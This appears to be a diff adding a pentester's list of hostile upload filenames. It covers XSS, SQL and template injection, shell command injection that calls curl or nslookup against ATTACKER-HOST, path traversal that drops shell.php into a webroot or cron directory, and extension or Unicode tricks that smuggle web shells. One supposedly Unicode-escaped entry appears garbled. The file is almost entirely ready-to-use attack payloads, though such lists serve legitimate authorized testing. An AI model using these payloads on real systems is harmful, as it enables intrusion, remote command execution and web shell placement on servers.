@@ -1,0 +1,59 @@
+# Request-time filename payloads — set these in the multipart `filename="..."` field.
+# Most contain chars NTFS/most filesystems can't store (< > " : | ? * / \ NUL), so they
+# CANNOT live as on-disk files here — copy the string into your upload request.
+# The upload BODY can be any benign image; the ATTACK is the filename itself.
+# Placeholders: ATTACKER-HOST (OOB), 169.254.169.254 (metadata). Confirm scope first (§2).
+
+## XSS — filename reflected unencoded in a page / JSON / error / directory listing
+"><svg onload=alert(document.domain)>.png
+"><img src=x onerror=alert(document.domain)>.jpg
+'-alert(document.domain)-'.gif
+<script>alert(document.domain)</script>.png
+"><script src=//ATTACKER-HOST/x.js></script>.jpg
+
+## SQL injection — filename stored into a query
+' OR '1'='1'.jpg
+'; WAITFOR DELAY '0:0:5'--.png
+'-(SELECT SLEEP(5))-'.gif
+`.jpg          # backtick / quote to break out of MySQL identifiers
+
+## Template / expression injection — filename rendered by a template engine
+${7*7}.png
+{{7*7}}.jpg
+#{7*7}.gif
+${{7*7}}.png
+<%= 7*7 %>.jpg
+
+## Command injection — filename passed to a shell (thumbnailer/convert/mv)
+$(curl http://ATTACKER-HOST/fn-cmdi).jpg
+`ping -c1 ATTACKER-HOST`.png
+;curl http://ATTACKER-HOST/semi;.gif
+|nslookup ATTACKER-HOST|.jpg
+
+## Path traversal — escape the upload directory (overwrite / drop into webroot)
+../../../../var/www/html/shell.php
+..\..\..\..\windows\temp\shell.aspx
+....//....//....//etc/cron.d/x
+%2e%2e%2f%2e%2e%2fshell.php
+
+## Extension / parser confusion (many need raw request; NTFS strips trailing dot/space)
+shell.php%00.jpg          # null-byte truncation (old PHP/CGI)
+shell.php.                 # trailing dot -> Windows/IIS strips -> shell.php
+shell.php%20               # trailing space
+shell.asp;.jpg             # old IIS semicolon parse -> shell.asp
+shell.php:.jpg             # NTFS ADS extension confusion
+shell.php::$DATA           # NTFS Alternate Data Stream -> shell.php
+shell.jpg.php              # double extension
+file.php.jpg               # double extension (opposite order)
+
+## Unicode / display tricks
+shell%E2%80%AEgpj.php      # U+202E RTLO — displays as "shellphp.jpg"
+%EF%BB%BFshell.php         # UTF-8 BOM prefix
+shell.php             # unicode-escaped 'h' if server unescapes
+overlong-%C0%AE%C0%AE%C0%AFshell.php   # overlong UTF-8 dot-dot-slash
+
+## Overlong / null / control
+$(python -c "print('A'*5000)").jpg      # 5000-char name -> buffer/path-length handling
+file%00.jpg
+file%0a.jpg               # newline in filename -> log/header injection
+file%0d%0aSet-Cookie:x=1.jpg
